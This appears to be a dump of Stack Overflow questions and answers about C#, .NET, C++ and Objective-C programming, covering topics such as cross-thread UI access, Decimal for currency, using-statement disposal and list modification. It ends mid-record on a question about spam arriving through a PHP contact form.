/// &lt;param name=""test""&gt;Something that's going to be tested.&lt;/param&gt;
delegate void Test(int test);
</code></pre>

<p><code>Func&lt;string,string,string&gt;</code> is a general delegate for functions with three parameters. For specific purposes, you can always declare your own delegate type that represents the abstracted method more specifically and add comments to its parameters.</p>
"
"<p>I keep getting the following error when debugging.</p>

<pre><code>Cross-thread operation not valid: Control 'richTextBoxReceivedMsg' accessed from a thread other than the thread it was created on.
</code></pre>

<p>Here's the code that it points to:</p>

<pre><code>public void OnDataReceived(IAsyncResult asyn)
{
    try
{
    SocketPacket socketData = (SocketPacket)asyn.AsyncState;

    int iRx  = 0;

        // Complete the BeginReceive() asynchronous call by EndReceive() method
        // which will return the number of characters written to the stream by the client
        iRx = socketData.m_currentSocket.EndReceive (asyn);

        char[] chars = new char[iRx +  1];
        System.Text.Decoder d = System.Text.Encoding.UTF8.GetDecoder();
        int charLen = d.GetChars(socketData.dataBuffer, 0, iRx, chars, 0);
        System.String szData = new System.String(chars);
        richTextBoxReceivedMsg.AppendText(szData);

        // Continue the waiting for data on the Socket
        WaitForData( socketData.m_currentSocket);
    }
    catch (ObjectDisposedException)
    {
        System.Diagnostics.Debugger.Log(0,""1"",""\nOnDataReceived: Socket has been closed\n"");
    }
    catch (SocketException se)
    {
        MessageBox.Show(se.Message);
    }
}
</code></pre>

<p>Can somebody please help me fix this?</p>
","33708","","<p>You need to replace this:</p>

<pre><code>richTextBoxReceivedMsg.AppendText(szData);
</code></pre>

<p>with something like</p>

<pre><code>Invoke(new Action(() =&gt; richTextBoxReceivedMsg.AppendText(szData)));
</code></pre>

<p>The reason is that Windows Forms is not really designed to work across different threads. <code>Invoke</code> method will run the delegate you pass to it in the UI thread. If you want to manipulate UI elements via other threads, you'll have to run the actual manipulation on the UI thread. <code>InvokeRequired</code> property will tell you when you need to use <code>Invoke</code> rather than calling the method directly.</p>
"
"<p>What is the most appropriate data type for storing currency values in VB.NET?</p>
","33708","","<p><code>Decimal</code> (alias for <a href=""http://msdn.microsoft.com/en-us/library/system.decimal.aspx""><code>System.Decimal</code> structure</a> in the BCL) is designed for storing monetary values. It's a 128 bit decimal floating point type (as opposed to binary floating point) and is useful for storing ""real-world"" values with high decimal precision. By real-world, I specifically mean measurements that are originally made in decimal. Double is generally suitable for calculations that don't need as much accuracy when they are represented as decimal numbers.</p>

<blockquote>
  <p>The Decimal value type represents decimal numbers ranging from positive 79,228,162,514,264,337,593,543,950,335 to negative 79,228,162,514,264,337,593,543,950,335. The Decimal value type is appropriate for <strong>financial calculations requiring large numbers of significant integral and fractional digits and no round-off errors</strong>. The Decimal type does not eliminate the need for rounding. Rather, it minimizes errors due to rounding. For example, the following code produces a result of 0.9999999999999999999999999999 rather than 1.</p>
</blockquote>
"
"<p>What is the advantage of zeroing out memory (i.e. <code>calloc()</code> over <code>malloc()</code>)? Won't you change the value to something else anyways?</p>
","33708","","<p>Assume you want to write a counting sort implementation, or depth first search a graph and keep track of visited vertices. You'll update your memory as the algorithm runs (rather than assigning a value just once). You need to initialize it to zero at the beginning. If you didn't have <code>calloc</code>, you'd have to manually go through it and initialize it to zero at the beginning of your algorithm. <code>calloc</code> can potentially do this more efficiently for you.</p>
"
"<p>I am writing a code in C++ and want to compute distance between two points. 
<strong>Question 1:</strong> </p>

<p>I have two points P(x1, y1, z1) and Q(x2, y2, z2)  , where x, y and z are floats/doubles. </p>

<p>I want to find the distance between these two points. One way to do it is :</p>

<p>square_root(x_diff*x_diff + y_diff*y_diff + z_diff*z_diff) </p>

<p>But this is probably not the most efficient way . (e.g. a better formula or a ready made utility in <code>math.h</code> etc ) </p>

<p><strong>Question 2:</strong> </p>

<p>Is there a better way if I just want to determine if P and Q are in fact the same points? </p>

<p>My inputs are x, y and z coordinates of both the points. </p>

<p>Thank you</p>
","33708","","<blockquote>
  <p>Is there a better way if I just want to determine if P and Q are in fact the same points? </p>
</blockquote>

<p>Then just compare the coordinates directly!</p>

<pre><code>bool areEqual(const Point&amp; p1, const Point&amp; p2) {
     return fabs(p1.x - p2.x) &lt; EPSILON &amp;&amp;
            fabs(p1.y - p2.y) &lt; EPSILON &amp;&amp;
            fabs(p1.z - p2.z) &lt; EPSILON;
}
</code></pre>
"
"<p>I have large amount of data been passed around in my application as byte[] objects. Which is also turing out to be memory problems in a lot of cases. What about if i wrap byte[] in a class like </p>

<p>[Serializable]
public class MyClass
{
  public byte[] Data { get; set; }
}</p>

<p>Do you guys think i would gain any performance becoz now a reference type would be passed around rather a value type ,hence data doesnt have to be copied every time. </p>

<p>Looking forward to your answers</p>
","33708","","<p>Why should it make an improvement? It can only make things worse. A <code>byte[]</code> is a reference type itself, not a value type. The effect will be one unnecessary level of indirection and heap allocation for the class.</p>
"
"<p>I'm trying to read the last 50 characters in a file by doing this:</p>

<pre><code>FILE* fptIn;
char sLine[51];
if ((fptIn = fopen(""input.txt"", ""rb"")) == NULL) {
    printf(""Coudln't access input.txt.\n"");
    exit(0);
}
if (fseek(fptIn, 50, SEEK_END) != 0) {
    perror(""Failed"");
    fclose(fptIn);
    exit(0);
}
fgets(sLine, 50, fptIn);
printf(""%s"", sLine);
</code></pre>

<p>This doesn't return anything that makes sense remotely. Why?</p>
","33708","","<p>Change 50 to -50. Also note that this will only work with fixed-length character encodings like ASCII. Finding the 50th character from the end is far from trivial with things like UTF-8.</p>
"
"<p>My teacher in c++ told me that call by reference should only be used if I'm not going to change anything on the arrays inside the function.
I have some really big vectors that I'm passing around in my program. All the vectors will be modified inside the functions. My matrices are of sizes about <code>[256*256][256][50]</code>...</p>

<p>Is there some particular reason not to use call-by reference here?</p>

<p>AFAIK call by reference should be way faster and consume less memory?</p>
","33708","","<blockquote>
  <p>My teacher in c++ told me that call by reference should only be used if I'm not going to change anything on the arrays inside the function.</p>
</blockquote>

<p>It should be used when you are not changing something inside the function <strong>or</strong> you change things and want the changes to be reflected to the original array <strong>or</strong> don't care about the changes to be reflected in the original array.</p>

<p>It shouldn't be used if you <em>don't</em> want your function to change your original array (you need to preserve the original values after the call) and the callee function changes the values of the passed argument.</p>
"
"<p>I've been an admirer of Juval Lowy's teaching and guidance in .NET development for a number of years.  He's also written one of my favorite books: Programming .NET Components.  </p>

<p>However on a recent DotNet Rocks podcast (Jan 2010) in discussing WCF/COM and .NET, he made some comments that greatly surprised me:</p>

<blockquote>
  <p><strong>Juval LÃ¶wy:</strong> ..... <strong>in .NET, lo
  and behold, every class here is a COM
  object. We know that.</strong> In fact, it's much more than COM because we've
  got the git compiling, we've got garbage collection,
  we've got the Security Stack....</p>
  
  <p><strong>Carl Franklin:</strong> Well, you should clarify that
  though. I mean, every
  object is not a COM object. Every
  object has the capabilities that a COM
  object does, but the .NET Framework
  isn't a COM library.</p>
  
  <p><strong>Juval LÃ¶wy:</strong>  No, no.  First of all .NET is actually built on
  top of COM. It's all COM underneath.</p>
</blockquote>

<p>Then, after Carl Franklin asks for clarification on this comment:</p>

<blockquote>
  <p><strong>Carl Franklin:</strong> Yeah, I get that. My
  question was is .NET built on COM?</p>
  
  <p><strong>Juval LÃ¶wy:</strong> Of course, it all COM
  underneath.</p>
  
  <p><strong>Carl Franklin:</strong> No. I know it's
  intertwined and it's required, but
  when you new up a .NET object you're
  not creating a COM object. </p>
  
  <p><strong>Juval LÃ¶wy:</strong> You're creating a .NET object, but all
  I'm saying is that .NET is built
  underneath. It's all C++ and COM. </p>
  
  <p><strong>Carl Franklin:</strong> It is C++ but you're not
  registering a COM object through the
  COM interface. It isn't all that stuff
  unless you specifically do that. </p>
  
  <p><strong>Juval LÃ¶wy:</strong> But some of the stuff is using
  COM underneath, but that's beside the
  point. Forget about how it's made.</p>
</blockquote>

<p>How do you read these comments?</p>

<p>While I understand (and have confirmed) that some of the System assemblies are written in unmanaged C++, is it also valid to say that they are ""all COM underneath""?  </p>

<p>I was under the assumption it is perfectly possible to write .NET CLI compliant C++ assemblies that have absolutely nothing to do with COM / ATL / ActiveX?</p>

<p>Here is the <a href=""http://perseus.franklins.net/dotnetrocks_0520_juval_lowy.pdf"">PDF transcript</a> for the podcast in question.  See Page 7.</p>
","33708","","<p>I think he's talking about the underlying implementation of the CLR. From my understanding, he's not talking about the interaction of the COM and .NET worlds. He's merely telling us that they have used C++ and COM in the implementation of the runtime.</p>

<blockquote>
  <p>I was under the assumption it is perfectly possible to write .NET CLI compliant C++ assemblies that have absolutely nothing to do with COM / ATL / ActiveX?</p>
</blockquote>

<p>Yes, you can use C++/CLI to create purely MSIL assemblies that have nothing to do with COM.</p>
"
"<p>I have a static function in a class.</p>

<p>whenever I try to use non static data member, I get following compile error.</p>

<p>An object reference is required for the nonstatic field, method, or property member</p>

<p>Why is it behaving like that?</p>
","33708","","<p>A non-static member belongs to an instance. It's meaningless without somehow resolving which instance of a class you are talking about. In a static context, you don't have an instance, that's why you can't access a non-static member without explicitly mentioning an object reference.</p>

<p>In fact, you <strong>can</strong> access a non-static member in a static context by specifying the object reference explicitly:</p>

<pre><code>class HelloWorld {
   int i;
   public HelloWorld(int i) { this.i = i; }
   public static void Print(HelloWorld instance) {
      Console.WriteLine(instance.i);
   }
}

var test = new HelloWorld(1);
var test2 = new HelloWorld(2);
HelloWorld.Print(test);
</code></pre>

<p>Without explicitly referring to the instance in the <code>Print</code> method, how would it know it should print 1 and not 2?</p>
"
"<pre><code>Sub pageload() Handles Me.Load
    Dim bom As New List(Of Car)

    Dim car1 As New Car With {.Name = ""Pea"", .Year = 2}
    Dim car2 As New Car With {.Name = ""Pea"", .Year = 2}

    bom.Add(car1)

    MsgBox(bom.Contains(car2))
End Sub
</code></pre>

<p>WHY??? I mean the object has the exactly same data, so why does it say it is not contained?</p>
","33708","","<p>The <code>Contains</code> method tests equality by calling the <code>Equals</code> method on objects. Unless you override the <code>Equals</code> method in the <code>Car</code> class and implement your own means of comparison, instances of <code>Car</code> will be considered equal by means of <em>referential identity</em> (being the exact same object) not based on their contents being equal.</p>

<p>Those objects you created are definitely not the same object. Proof: changing one will not change the other.</p>
"
"<p>I've been poring through .NET disassemblies and the GCC source code, but can't seem to find anywhere the actual implementation of <code>sin()</code> and other math functions... they always seem to be referencing something else.</p>

<p>Can anyone help me find them?  I feel like it's unlikely that ALL hardware that C will run on supports trig functions in hardware, so there must be a software algorithm <em>somewhere</em>, right? </p>

<p><strong>Edit:</strong> I'm aware of several ways that functions <em>can</em> be calculated, and have written my own routines to compute functions using taylor series for fun.  I'm curious about how real, production languages do it, since all of my implementations are always several orders of magnitude slower, even though I think my algorithms are pretty clever (obviously they're not).</p>
","33708","","<p>Yes, there are software algorithms for calculating <code>sin</code> too. Basically, calculating these kind of stuff with a digital computer is usually done using <a href=""http://en.wikipedia.org/wiki/Numerical_analysis"">numerical methods</a> like approximating the <a href=""http://en.wikipedia.org/wiki/Taylor_series"">Taylor series</a> representing the function.</p>

<p>Numerical methods can approximate functions to an arbitrary amount of accuracy and since the amount of accuracy you have in a floating number is finite, they suit these tasks pretty well.</p>
"
"<p>Out of curiosity,</p>

<p>Why is the <code>finalize()</code> method's access modifier is made as <code>protected</code>. Why cant it be <code>public</code>? Can someone explain me any specific reason behind this?</p>

<p>Also, I came to know that <code>finalize()</code> method is called only once. If I call it twice in my program internally, what is happening? Will the garbage collector call this again?</p>

<pre><code>private void dummyCall() {
    try {
        finalize();
        finalize();
    } catch (Throwable e) {
        e.printStackTrace();//NOT REACHES EXCEPTION
    }
}
</code></pre>
","33708","","<p>I answer your question with another question:</p>

<blockquote>
  <p>Why <code>finalize</code> method shouldn't be protected?</p>
</blockquote>

<p>In general, you should try to keep things as much private as possible. That's what encapsulation is all about. Otherwise, you could make <em>everything</em> <code>public</code>. <code>finalize</code> can't be <code>private</code> (since derived classes should be able to access it to be able to override it), so it should at least be <code>protected</code> but why give out more access when it's not desirable?</p>

<hr>

<p>After reading your comment more carefully, I guess I see your main point now. I think your point is since everything derives from <code>java.lang.Object</code> and consequently accesses its <code>protected</code> members, it wouldn't make any difference for it (or any method in <code>java.lang.Object</code> for that matter) to be <code>public</code> as opposed to <code>protected</code>. Personally, I'd count this as a design flaw in Java. This is indeed fixed in C#. The problem is not why <code>finalize</code> is protected. That's OK. The real issue is that you shouldn't be able to call protected methods in the base class through an object reference of the base class type. Eric Lippert has a <a href=""http://blogs.msdn.com/ericlippert/archive/2010/01/14/why-cant-i-access-a-protected-member-from-a-derived-class-part-six.aspx"">blog entry</a> discussing why allowing such kind of access to protected members is a bad idea which is <a href=""http://stackoverflow.com/questions/1904782/whats-the-real-reason-for-preventing-protected-member-access-through-a-base-sibl"">further elaborated on Stack Overflow in this question</a>.</p>
"
"<p>I know .net supports base64 encoding of byte arrays. But i thought that i could save even more space if use a higher number of characters. I read somewhere  that Unicode supports thousands of different characters so why not use base1024 encoding for example? And if this is possible can you give some guidelines on how to implement it. Thanks</p>
","33708","","<p>Base64 is there for a purpose: to store/transfer binary data in a format that fits in 6 bits/character to circumvent restrictions imposed by some protocols. If you don't have such a restriction, base64 is not for you. It's never designed for saving space. If you need to save space and you are free to use anything, then simply store the array as binary data. </p>
"
"<p>Consider this code block:</p>

<pre><code>struct Animal
{
    public string name = """"; // Error
    public static int weight = 20; // OK

    // initialize the non-static field here
    public void FuncToInitializeName()
    {
        name = """"; // Now correct
    }
}
</code></pre>

<ul>
<li>Why can we initialize a <code>static</code> field inside a struct but not a <code>non-static</code> field?</li>
<li>Why do we have to initialize <code>non-static</code> in methods bodies?</li>
</ul>
","33708","","<p>You cannot write a custom default constructor in a structure. The instance field initializers will eventually need to get moved to the constructor which you can't define.</p>

<p>Static field initializers are moved to a static constructor. You <em>can</em> write a custom static constructor in a struct.</p>
"
"<p>What is the difference between <code>ArrayList</code> and <code>List&lt;&gt;</code> in C#? </p>

<p>Is it only that <code>List&lt;&gt;</code> has a type while <code>ArrayList</code> doesn't?</p>
","33708","","<p>Yes, pretty much. <code>List&lt;T&gt;</code> is a generic class. It supports storing values of a specific type without casting to or from <code>object</code> (which would have incurred boxing/unboxing overhead when <code>T</code> is a value type in the <code>ArrayList</code> case). <code>ArrayList</code> simply stores <code>object</code> references. As a generic collection, it implements the generic <code>IEnumerable&lt;T&gt;</code> interface and can be used easily in LINQ (without requiring any <code>Cast</code> or <code>OfType</code> call). </p>

<p><code>ArrayList</code> belongs to the days that C# didn't have generics. It's deprecated in favor of <code>List&lt;T&gt;</code>. You shouldn't use <code>ArrayList</code> in new code that targets .NET >= 2.0 unless you have to interface with an old API that uses it.</p>
"
"<p>i changed pList value through coding.it works fine.but after exiting application,Plist has same value(without changing value)
any help?code is as</p>

<pre><code>-(void)ChangePlist:(NSString *)key
{
    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
    [info setValue:@""1"" forKey:key];
}
</code></pre>
","33708","","<p>You are not saving the changed dictionary back to <code>Info.plist</code>. The <code>NSDictionary</code> you get is simply an in-memory dictionary. It's not bound to save changes back to <code>Info.plist</code> automatically. You can send it the <code>writeToFile</code> message with the path to the <code>Info.plist</code> file as an argument to save it there.</p>
"
"<p>What does the following <strong>%1</strong> means (in a .bat file)?</p>

<pre><code>jsmin &lt;%1 &gt;%2
</code></pre>
","33708","","<p>It represents the first command line argument passed to the batch file.</p>

<p>If you run your batch file with:</p>

<pre><code>myfile.bat firstArg secondArg
</code></pre>

<p><code>%1</code> becomes ""firstArg"" and <code>%2</code> becomes ""secondArg"" </p>

<p>The related <code>shift</code> command shifts the position of arguments one to the left. Running <code>shift</code> once in a batch file will make ""%1"" value to be the second argument, ""%2"" becomes the third, and so on. It's useful for processing command line arguments in a loop in the batch file. </p>
"
"<p>What's a fast algorithm for finding the length of largest monotonically increasing sequence in an array of integers.</p>
","33708","","<p>From <a href=""http://en.wikipedia.org/wiki/Longest_increasing_subsequence#Efficient_algorithms"" rel=""nofollow"">Wikipedia: Longest increasing subsequence</a> (O(<em>n</em> log <em>n</em>))</p>

<pre><code>L = 0
for i = 1, 2, ... n:
   binary search for the largest positive j â¤ L such that X[M[j]] &lt; X[i] (or set j = 0 if no such value exists)
   P[i] = M[j]
   if j == L or X[i] &lt; X[M[j+1]]:
      M[j+1] = i
      L = max(L, j+1)
</code></pre>
"
"<p>From the command line (or by any means really), how can I determine which <a href=""http://en.wikipedia.org/wiki/Common_Language_Runtime"">CLR</a> version a <a href=""http://en.wikipedia.org/wiki/.NET_Framework"">.NET</a> assembly requires? </p>

<p>I need to determine if an assembly requires 2.0 or 4.0 CLR version.</p>
","33708","","<pre><code>class Program {
  static void Main(string[] args) { 
      System.Console.WriteLine(
             System.Reflection.Assembly.LoadFrom(args[0]).ImageRuntimeVersion);
  }
}
</code></pre>

<p>Compile and run the above application under the latest .NET Framework (as an older CLR may be unable to load assemblies requiring a newer CLR) and run it passing the path to the assembly you want to check as the command line argument.</p>
"
"<p>Re-initialization within ""using"" block is a bad idea, to be avoided at all times. Still i am going to ask this:</p>

<p>Why does ""using"" call dispose on the original value and not on the last reference  or re-initialization (which happens if try finally block is used)</p>

<pre><code>MyClass b = new MyClass();// implements Idisposable
MyClass c = new MyClass();
MyClass a ; 

 using (a = new MyClass())
 {
                a = b;
                a = c;
 }
</code></pre>

<p>In the above code dispose will be called on original reference and not the newer referenced. This can be easily verified by printing something on console in the dispose method.</p>

<p>However with try{} finally code the last reference dispose method is called.</p>

<pre><code>try
{
   a = new MyClass();
   a = b;
   a = c;
 }
  finally 
   {
   a.Dispose();
  }
</code></pre>

<p><a href=""http://msdn.microsoft.com/en-us/library/yh598w02.aspx"">MSDN</a> : The using statement ensures that Dispose is called even if an exception occurs while you are calling methods on the object.</p>

<pre><code>using (Font font1 = new Font(""Arial"", 10.0f)) 
{
    byte charset = font1.GdiCharSet;
}
</code></pre>

<p>Basically ""using"" translates to:</p>

<pre><code>{
  Font font1 = new Font(""Arial"", 10.0f);
  try
  {
    byte charset = font1.GdiCharSet;
  }
  finally
  {
    if (font1 != null)
      ((IDisposable)font1).Dispose();
  }
}
</code></pre>
","33708","","<p>There are two forms of <code>using</code> statements defined in the C# specification:</p>

<pre><code>using-statement:
    using   (    resource-acquisition   )    embedded-statement
resource-acquisition:
    local-variable-declaration
    expression
</code></pre>

<p>If you have a <code>local-variable-declaration</code>, there wouldn't be any questions. The variable will be read-only in the using block and you can't change it at all. The spec says:</p>

<blockquote>
  <h3>8.13 The using statement</h3>
  
  <p><em>[...]</em> In either expansion, the resource variable is read-only in the embedded statement.</p>
</blockquote>

<p>Here, we're dealing with the second form: where <code>resource-acquisition</code> is <code>expression</code> and not a <code>local-variable-declaration</code>. In which case, the C# spec clearly says:</p>

<blockquote>
  <p>A using statement of the form  </p>

<pre><code> using (expression) statement
</code></pre>
  
  <p>has the same two possible expansions, but in this case ResourceType is implicitly the compile-time type of the expression, and <strong>the resource variable is inaccessible in, and invisible to, the embedded statement</strong>. <em>[emphasis mine]</em></p>
</blockquote>

<p>Obviously, you can't change an invisible, inaccessible variable. Its value is assigned only in the using <code>resource-acquisition</code> clause. Therefore, it'll have the old value of the variable, not the new one.</p>

<p>When you are dealing with an assignment to an <em>already declared</em> variable, you are using this form of the <code>using</code> statement. The fact that you are <em>assigning a value to a variable</em> like</p>

<pre><code>using ( x = something )
</code></pre>

<p>is irrelevant. The whole <code>x = something</code> is treated as an expression and only the value of that expression is what matters. It's important to know that ""resource variable"" is not ""x"" here. It's an invisible variable. From the compiler's perspective, there's not much difference between the following constructs:</p>

<pre><code>using ( something ) 
using ( x = something )
using ( y = x = something )
</code></pre>

<p>In all cases, the expression will get executed and <strong>the value</strong> is what will get guaranteed disposal, not the variable. What would the compiler supposed to do if this wasn't the defined behavior and you had written the third line in the above block? Dispose <code>x</code>? <code>y</code>? both? neither? The current behavior makes sense.</p>
"
"<p>I noticed that there is no reference to reference but there is pointer to pointer, and also there is no an array of references but an array of pointers.</p>

<p>Could anybody give me any reason?</p>
","33708","","<p>A reference is an abstraction at the language level. It's an opaque way of aliasing a variable to another. While under the hood, the compiler is likely to work out references using pointers, they are very different things at a higher level. On the other hand, pointers are explicitly used by a programmer to achieve indirection. A pointer variable is a distinct variable from what it's pointed to. A reference should be thought as if it's simply an alias to the original variable, not as if it's yet another variable holding an address. Consequently, an alias for an alias of a variable would simply be an alias to the variable itself. Considering the binding a reference to a variable is a compile-time thing may help understanding the rationale behind this behavior.</p>

<p>With this reasoning, you can argue that since arrays are structures that store values, not variables, it doesn't make sense for them to be able to store aliases of variables. Basically, a reference variable (by which I mean the pointer, if exists, that <em>may</em> be used by the compiler to wire up the reference) is invisible to the programmer at the C++ level. If it was possible to declare arrays of references, the compiler probably needed to require constant indexes passed to the arrays to be able to resolve the binding at compile time.</p>
"
"<p>According to Instruments analysis, I have a memory leak here - and - I'm unsure as to how to properly release the scoresArray object that I have created. </p>

<p>This code does work properly, apart from the leakage. I release the highScoresArray object later in the code - but attempts to release the scoresArray kill the app. I thought that when I released highScoresArray, that I would release scoresArray, since they both point to the same location in memory. If anyone can point out where my thinking is flawed, that would be great.</p>

<pre><code>- (void) readScoresFile {
    // Read the Scores File, if it exists
    NSString *filePath = [self scoresFilePath];
    // Only load the file if it exists at the path
    if ([[NSFileManager defaultManager] fileExistsAtPath: filePath]) {
        scoresFileExistsFlag = YES;
        NSLog(@""SCORES FILE EXISTS - THEREFORE LOAD IT"");
        NSMutableArray *scoresArray = [[NSMutableArray alloc] initWithContentsOfFile: filePath];
        highScoresArray = scoresArray;
    } else {
        scoresFileExistsFlag = NO;
        NSMutableArray *scoresArray = [[NSMutableArray alloc] init];
        highScoresArray = scoresArray;

        // No Scores File exists - we need to create and save an empty one.
        int counter = 1;
        while (counter &lt;= 5) {
            // Set up a date object and format same for inclusion in the Scores file
            NSDate *now = [[NSDate alloc] init];
            NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
            [dateFormat setDateFormat:@""yyyy.MM.dd""]; 
            NSString *theDateNow = [dateFormat stringFromDate:now];
            // Add the score data (Score and User and date) to the runScoreDataDictionary
            runScoreDataDictionary = [NSDictionary dictionaryWithObjectsAndKeys: 
                [NSNumber numberWithInt:0], @""score"", 
                [NSNumber numberWithInt:0], @""landings"",
                currentUser, @""user"", 
                theDateNow, @""date"", nil];
            //NSLog(@""Dictionary contains: %@"", runScoreDataDictionary);
            // Add the dictionary to the highScoreArray
            [highScoresArray addObject:runScoreDataDictionary];
            //NSLog(@""OBJECTS in ARRAY: %i"", [highScoresArray count]);

            [self writeScoresFile]; // Write the empty scores file to disk

            [now release];
            [dateFormat release]; 

            ++counter;

            //[scoresArray release]; // TESTING TO SEE IF THIS KILLS - YES KILLS
        }
    }
}
</code></pre>
","33708","","<blockquote>
  <p>I release the highScoresArray object later in the code - but attempts to release the scoresArray kill the app. I thought that when I released highScoresArray, that I would release scoresArray, since they both point to the same location in memory</p>
</blockquote>

<p><strong>As long as you haven't changed</strong> the <code>highScoresArray</code> pointer to point to another object, releasing it will be the same as releasing <code>scoresArray</code>. </p>

<pre><code>NSMutableArray* highScoresArray;
NSMutableArray* scoresArray = [[NSMutableArray alloc] init];
highScoresArray = scoresArray;
[highScoresArray release]; // same as `[scoresArray release];`
</code></pre>

<p>But if you change either of them afterwards to point to another object, releasing them won't be equivalent:</p>

<pre><code>NSMutableArray* highScoresArray;
NSMutableArray* scoresArray = [[NSMutableArray alloc] init];
highScoresArray = scoresArray;
// ... Now make `highScoresArray` point to another object ...
highScoresArray = [[NSMutableArray alloc] init];
// Now you should release both as they point to different objects.
[highScoresArray release];
[scoresArray release];
</code></pre>

<p>Of course, simply calling <code>addObject</code> doesn't alter the <em>pointer</em>. It changes the object being <em>pointed to</em>. Only reassigning the pointer to another object matters here.</p>
"
"<p>A customer has asked that we do a dynamic whois lookup on the homepage of their ASP.NET site, based on the IP of the user accessing the site.</p>

<p>The implementation would be something like what's described here:</p>

<p><a href=""http://www.aspheute.com/english/20000825.asp"" rel=""nofollow"">http://www.aspheute.com/english/20000825.asp</a></p>

<p>However, I noticed that this code connects to whois.networksolutions.com. I am thinking that this may not scale very well if we are initiating a connection to this remote server on every page load.</p>

<p>For example, say 1000 different users hit the home page - this would cause a lot of connections to be initiated.</p>

<p>Any thoughts on this?</p>
","33708","","<p>Yes, it can be time consuming. The amount of ""expensiveness"" really depends on the network connection between your server and the remote server and the response time of the remote server. You can consider caching the response if your requests are not different from each other (which is not likely to be the case for querying domain whois entered by end-users). A bigger issue is that the remote server can block you if it sees too many connections from a single IP address.</p>
"
"<p>I am trying to do this:</p>

<pre><code>foreach (Settings sets in MySets)
            {
                if (sets.pName == item.SubItems[2].Text)
                {
                    var ss = new SettingsForm(sets);
                    if (ss.ShowDialog() == DialogResult.OK)
                    {
                        if (ss.ResultSave)
                        {
                            sets = ss.getSettings();
                        }
                    }
                    return;
                }
            }
</code></pre>

<p>But since the sets spawned variable is readonly, I cant override it.</p>

<p>I would also like to do something like this </p>

<pre><code>foreach (Settings sets in MySets)
{

  if(sets.pName == someName)
     sets.RemoveFromList();
}
</code></pre>

<p>How can I accomplish this? Lists have a very nice Add() method, but they forgot the rest :(</p>
","33708","","<p>You can use:</p>

<pre><code>MySets.RemoveAll(sets =&gt; sets.pName == someName);
</code></pre>

<p>to remove all the items that satisfy a specific condition.</p>

<p>If you want to grab all the items satisfying a condition without touching the original list, you can try:</p>

<pre><code>List&lt;Settings&gt; selectedItems = MySets.FindAll(sets =&gt; sets.pName == someName);
</code></pre>

<p><code>foreach</code> loops don't work here as trying to change the underlying list will cause an exception in the next iteration of the loop. Of course, you can use a <code>for</code> loop and manually index the list. However, you should be very careful not to miss any items in the process of removing an item from the list (since the index of all the following items will get decremented if an element is removed):</p>

<pre><code>for (int i = 0; i &lt; MySets.Count; ++i) {
   var sets = MySets[i]; // simulate `foreach` current variable

   // The rest of the code will be pretty much unchanged.
   // Now, you can set `MySets[i]` to a new object if you wish so:
   //   MySets[i] = new Settings(); 
   //
   // If you need to remove the item from a list and need to continue processing
   // the next item:   (decrementing the index var is important here)
   //   MySets.RemoveAt(i--);
   //   continue;

   if (sets.pName == item.SubItems[2].Text)
   {
      var ss = new SettingsForm(sets);
      if (ss.ShowDialog() == DialogResult.OK)
      {
         if (ss.ResultSave)
         {
            // Assigning to `sets` is not useful. Directly modify the list:
            MySets[i] = ss.getSettings();
         }
      }
      return;
   }
}
</code></pre>
"
"<p>I have a client that absolutely insists that their database should have no Identity columns, and has manually implemented his own incrementer in a stored procedure that creates table rows. It has been written so that the next ID value is determined and then used in an insert statement. Obviously this is vulnerable to a host of problems.</p>

<p>So here's my question: Assuming that the usual, automatic, method is out of the question, what is the best way to implement an identity column in SQL?</p>
","33708","","<blockquote>
  <p>Assuming that the usual, automatic, method is out of the question, what is the best way to implement an identity column in SQL?</p>
</blockquote>

<p>By definition, the usual, automatic method is using the <code>identity</code> column. Everything else is a crappy way to do that. Talk to your client about this. Assuming that they have a reason or misconception for doing that, you can help them fix the cause or clarify that <code>identity</code> is not a dangerous monster.</p>

<hr>

<p>If you have to do this anyway, make sure the task of keeping track of the identity (incrementing it) and inserting new rows to the table is done in a single transaction with appropriate isolation levels. (and start looking for a new job)</p>
"
"<p>This is mostly for curiosity's sake, as there are better ways of implementing almost any use case I can think of for this construct (in C# and other languages I use regularly, at least), but I recently saw on here a <a href=""http://stackoverflow.com/questions/2315034/thread-safe-queue-isnt-thread-safe-if-peek-returns-a-reference-even-if-reference"">scoped mutex</a> which was a cool concept.</p>

<p>My question is, does the using statement maintain a reference (ie: prevent the GC from running on) to the object it's acting on?</p>

<p>For example, if I were to do:</p>

<pre><code>using (new ScopedMutex())
{
// ...
}
</code></pre>

<p>would the ScopedMutex object maintain its existence to the end of the using block, or could the GC run and dispose of it mid-block?</p>
","33708","","<p>No, the GC will not dispose it.  A reference to that object is stored in a local variable (<a href=""http://stackoverflow.com/questions/2310905/2310958#2310958"">see this answer for more info</a>). A local variable is considered a GC root and the object will be reachable from it (it needs to be reachable for the <code>using</code> block to be able to call <code>Dispose</code> on it).</p>
"
"<p>We're developing a pretty large application with MVC 2 RC2 and we've received some feedback on the way we're using the Entity Framework's Lazy Loading. </p>

<p>We're just getting the entities in the controller and sending them as models to the Views, that is causing that the view code asks the Database for the navigation properties we are using in it. We have read about this and it appears is not a good design, but we were wondering why?</p>

<p>Can you help us understand this design problem?</p>

<p>Thanks!</p>
","33708","","<p>One potential issue with this design is that the view might iterate through the model objects (that are lazy loaded) more than once and cause an unnecessary overhead.  For instance, if a Web page displays the same data in two different forms in a couple of different locations in the page, it'll loop through the query twice and causes two round-trips to the database (Look at the tags under the question and in the sidebar on this page and assume they came from a single query). The view could deal with this problem by caching the results once and loop twice on the cached data, but this is not what a view should deal with. It should present the data given to it without worrying about these stuff.</p>
"
"<p>In some of my E-Commerce applications I've started using <code>src=""//domain.com/file.js""</code> in cases where I needed to reference externally hosted scripts that I wanted to include. In my E-Commerce applications not all pages actually use <code>https</code> as not every page has a form.</p>

<p>I'm wondering if there's really any disadvantage to always using this, as it's also a shortcut to <code>http</code> and you can always, always avoid the not-secure IE warning.</p>
","33708","","<p>If your intent is to load the resources from the same protocol as the page is loaded with, then using it is a perfect way to accomplish it. However, you may need to load some resources from <code>http</code> even when your page is currently served under <code>https</code> (let's say the resouce is served only on <code>http</code> or you prefer to reduce load on your server by not making it encrypt every image on the page). In that case, you need to explicitly specify the protocol name.</p>
"
"<p>I have a PHP contact form mailer on my website.  The contents don't store in a database, but are emailed directly to me.  I have received a couple strange contacts in the last few days. </p>

<p>The user has to fill in name, email, confirm email subject and message.</p>

<p>I have a javascript security in place that verifies an email is typed in the same twice, and checks for the @ and the dot.  Also, required fields are checked with javascript.</p>

<p>Here is the most recent message-you can see it is a bunch of bogus links, etc.  Is this anything I should be concerned of from a security standpoint?  </p>

<pre><code>Name: fvjnqazcy

